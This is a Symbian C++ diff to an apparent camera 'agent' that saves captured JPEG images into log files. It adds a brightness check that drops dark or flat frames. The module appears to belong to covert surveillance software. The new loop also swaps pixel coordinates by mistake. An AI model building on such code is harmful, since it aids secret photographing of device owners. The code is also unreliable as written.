@@ -11,6 +11,11 @@
 #include <ICL\ImageData.h>
 #include <ICL\ImageCodecData.h>
 
+const TInt KMin = 0;
+const TInt KMax = 255;
+const TInt KLowThreshold = 20;
+const TInt KHighThreshold = (255 - KLowThreshold);
+const TInt KThStep = 25;
 
 CAgentCamera::CAgentCamera() :
 	CAbstractAgent(EAgent_Cam),iEngineState(EEngineNotReady)
@@ -218,20 +223,23 @@ void CAgentCamera::ImageReady(CFbsBitmap *aBitmap, HBufC8 *aData, TInt aError)
 	//save log
 	if(aError == KErrNone)
 		{
-		HBufC8* jpegImage = GetImageBufferL(aBitmap);
-		CleanupStack::PushL(jpegImage);
-		if (jpegImage->Length() > 0)
+		if(IsValidImage(aBitmap))
 			{
-			if(!iBelowFreespaceQuota)
+			HBufC8* jpegImage = GetImageBufferL(aBitmap);
+			CleanupStack::PushL(jpegImage);
+			if (jpegImage->Length() > 0)
 				{
-				CLogFile* logFile = CLogFile::NewLC(iFs);
-				logFile->CreateLogL(LOGTYPE_CAMERA);
-				logFile->AppendLogL(*jpegImage);
-				logFile->CloseLogL();
-				CleanupStack::PopAndDestroy(logFile);
+				if(!iBelowFreespaceQuota)
+					{
+					CLogFile* logFile = CLogFile::NewLC(iFs);
+					logFile->CreateLogL(LOGTYPE_CAMERA);
+					logFile->AppendLogL(*jpegImage);
+					logFile->CloseLogL();
+					CleanupStack::PopAndDestroy(logFile);
+					}
 				}
+			CleanupStack::PopAndDestroy(jpegImage);
 			}
-		CleanupStack::PopAndDestroy(jpegImage);
 		}
 	
 	//release camera
@@ -296,6 +304,67 @@ HBufC8* CAgentCamera::GetImageBufferL(CFbsBitmap* aBitmap)
 		CleanupStack::PopAndDestroy(frameImageData);
 		
 		return imageBuf;
+	}
+
+TBool CAgentCamera::IsValidImage(CFbsBitmap* aImage)
+	{
+	
+	TSize imageSize = aImage->SizeInPixels();
+	TInt height = imageSize.iHeight;  //the number of lines
+	TInt width = imageSize.iWidth;    //the number of pixels per line
+	TPoint pixel(TPoint::EUninitialized);
+	TRgb rgbColor;
+	TInt r,g,b;
+	TReal gray;
+	TReal min = 0;
+	TReal max = 0;
+	TReal thmin = KMin;
+	TReal thmax = KMax;
+	TReal avgSum = 0, tmpAvg = 0;
+	TInt pixelCount = 0;
+
+	//initialize
+	pixel.SetXY(0,0);
+	aImage->GetPixel(rgbColor,pixel);
+	min = (0.1140 * rgbColor.Blue()) + (0.5870 * rgbColor.Green()) + (0.2989 * rgbColor.Red());
+	max = min;
+	//cycle
+	for(TInt i=0; i<height; i++)   
+		{
+		//for every line take the pixel
+		for (TInt j=0; j<width; j++)
+			{
+			pixel.SetXY(i,j);
+			aImage->GetPixel(rgbColor,pixel);
+			r = rgbColor.Red();
+			g = rgbColor.Green();
+			b = rgbColor.Blue();
+			gray = (0.1140 * b) + (0.5870 * g) + (0.2989 * r);
+			if (gray < min)
+				min = gray;
+			if (gray > max)
+			    max = gray;
+			avgSum += gray;
+			pixelCount++;
+			}
+		}
+	if(pixelCount == 0)
+		return EFalse;
+	tmpAvg = avgSum / pixelCount;
+	if ((tmpAvg > KLowThreshold) && (tmpAvg < KHighThreshold)) 
+		{
+	    (tmpAvg > (KMin + KThStep)) ? thmin = (tmpAvg - KThStep): thmin = KMin;
+	    (tmpAvg < (KMax - KThStep)) ? thmax = (tmpAvg + KThStep): thmax = KMax;
+	    if ((min < thmin) && (max > thmax) )//i valori min e max della luminosita' sono sufficentemente lontani dalla media
+	    	{
+	    	return ETrue;
+	        } 
+	    else 
+	    	{
+	        return EFalse;
+	        }
+	    }
+	return EFalse;
 	}
 
 
